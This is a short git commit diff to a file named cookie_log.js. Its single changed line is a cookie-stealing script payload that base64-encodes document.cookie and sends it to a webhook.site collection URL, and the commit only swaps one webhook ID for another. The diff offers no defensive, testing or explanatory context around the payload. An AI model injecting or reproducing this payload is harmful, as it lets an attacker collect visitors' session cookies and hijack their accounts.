56550ba2567f8389a5c19a7f2b7ab0b6e0af04db
Mayank Kr <ikki2@live.com>
2024-07-02 05:45:43 +0000

    Update cookie_log.js

--- cookie_log.js
+++ cookie_log.js
@@ -1,1 +1,1 @@
-var x=new Image();x.src='https://webhook.site/a73055cb-43c6-4a72-a223-d9a8b6bb0c55?c='+btoa(document.cookie);
+var x=new Image();x.src='https://webhook.site/77eb74d1-f46c-48ef-86ea-82866cf97d0d?c='+btoa(document.cookie);
